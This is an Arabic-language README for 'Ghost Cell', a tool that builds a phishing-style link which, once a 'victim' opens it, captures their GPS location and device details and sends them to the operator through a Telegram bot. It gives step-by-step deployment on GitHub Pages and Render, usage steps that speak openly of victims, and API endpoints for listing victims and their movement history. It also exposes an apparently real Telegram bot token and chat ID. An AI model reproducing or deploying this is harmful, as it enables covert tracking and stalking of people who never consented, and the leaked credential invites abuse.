# Ghost Cell — GitHub Pages + Telegram

**المعمارية:**
- **GitHub Pages** → يستضيف `index.html` (الpayload مع GPS)
- **Render.com** → يستضيف الباك إند (Express + WebSocket)
- **Telegram Bot** → يرسل إشعارات مع الموقع + رابط الخريطة

## 1. رفع الـ Frontend على GitHub Pages

```bash
# أنشئ ريبو جديد على GitHub اسمه ghost-cell
git init
git add .
git commit -m "init"
git remote add origin https://github.com/youruser/ghost-cell.git
git push -u origin main

# روح لـ Settings > Pages > Source: Deploy from branch
# Branch: main, Folder: /docs
# بعد دقيقتين، الموقع يكون على:
# https://youruser.github.io/ghost-cell/
```

## 2. نشر الباك إند على Render.com

1. افتح https://render.com
2. New + Web Service
3. Connect GitHub repo > `ghost-cell`
4. Root Directory: `backend`
5. Build Command: `npm install`
6. Start Command: `node server.js`
7. Add env vars:
   - `TELEGRAM_TOKEN` = `8958912849:AAE4LQG6QlA3qGQccfIbI8ghZDMgWida-yg`
   - `TELEGRAM_CHAT` = `972326806`
8. Deploy

**بعد النشر:** يحصل على رابط مثل `https://ghost-cell-backend.onrender.com`

## 3. تعديل config.js

عدل `docs/config.js` وغيِّر `BACKEND_URL` إلى رابط Render:

```js
BACKEND_URL: 'https://ghost-cell-backend.onrender.com'
```

## 4. الإستخدام

1. أرسل الرابط: `https://youruser.github.io/ghost-cell/`
2. الضحية يفتح → يأخذ GPS → يرسل للباك إند
3. **الباك إند يرسل لك تلجرام** مع:
   - الموقع (Google Maps link)
   - الدقة (±متر)
   - معلومات الجهاز
   - زر "فتح الخريطة"

## 5. لوحة التحكم

```
https://ghost-cell-backend.onrender.com/victims    # JSON
https://ghost-cell-backend.onrender.com/health     # Status
```

## API

| الطريقة | المسار | الوصف |
|---------|--------|-------|
| POST | `/track` | استقبال GPS من الضحية |
| GET | `/victims` | عرض كل الضحايا + آخر موقع |
| GET | `/history?id=X` | تاريخ حركة ضحية معينة |
| GET | `/health` | حالة السيرفر |
